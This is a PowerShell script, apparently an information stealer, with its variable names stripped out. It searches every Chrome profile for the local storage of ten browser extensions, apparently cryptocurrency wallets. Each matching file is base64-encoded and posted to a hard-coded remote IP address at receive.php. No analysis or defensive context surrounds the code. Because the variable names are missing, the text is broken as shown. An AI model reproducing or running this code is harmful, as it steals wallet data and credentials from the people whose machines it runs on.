    function UploadFolder {
        param (
            [string],   
            [string]  
        )
         = Split-Path -Path  -Leaf
        Write-Output 

        if (-not (Test-Path )) {
            Write-Host " The folder does not exist."
            return
        }
         = Get-ChildItem -Path  -Recurse -File
         = Get-Date -UFormat "%s"  
         = [System.DateTime]::UtcNow
         = .ToString("yyyy-MM-dd_HH-mm-ss")

        foreach ( in ) {
             = .FullName -replace [regex]::Escape(), ""
             =  -replace [regex]::Escape(.Name), ""
             =  .Substring(1)
             =  -replace '\\', '/'
            

             =  + "/" +  + "/" +  + "/" + 
            
            Write-Output "Uploading file: "
            GetFile .FullName .Name 
        }
    }
    ='http://38.180.137.24/receive.php'
    function GetFile() {
        param (
            ,
            , 
            
        )
        Write-Output 
        =[IO.File]::readallbytes();
        =[System.Convert]::ToBase64String();
        =[regex]::Replace(,'=','%');
        ='access='++'&name='++'&folder='+;
        Invoke-WebRequest -Uri  -Method Post -Body ;
    }

      = @('bfnaelmomeimhlpmgjnjophhpkkoljpa','nkbihfbeogaeaoehlefnkodbefgpgknn','bhhhlbepdkbapadjdnnojkbgioiodbic','egjidjbpglichdcondbcbdnbeeppgdph','idnnbdplmphpflfnlkomgpfbpcgelopg','ppbibelpcjmhbdihakflkdcoccbgbkpo','mcohilncbfahbmgdjkbpemcciiolgcge','ldinpeekobnhjjdofggfgjlcehhmanlj','ibnejdfjmmkpcnlpebklmnkoeoihofec','hnfanknocfeofbddgcijnmhnfnkdnaad')
     = C:\Users\devil
     = Join-Path -Path  -ChildPath "AppData\Local\Google\Chrome\User Data\Default"
    for ( = 0;  -le 200; ++) {
         = if ( -eq 0) {} else {Join-Path -Path  -ChildPath "AppData\Local\Google\Chrome\User Data\Profile "}
        if (Test-Path ) {
            foreach ( in ) {
                 = Join-Path -Path  -ChildPath ("Local Extension Settings\" + )
                Write-Output ""
                if (Test-Path ) {
                     = "Profile " + 
                    UploadFolder -folderPath  -extraPath 
                }
            }
        }
    }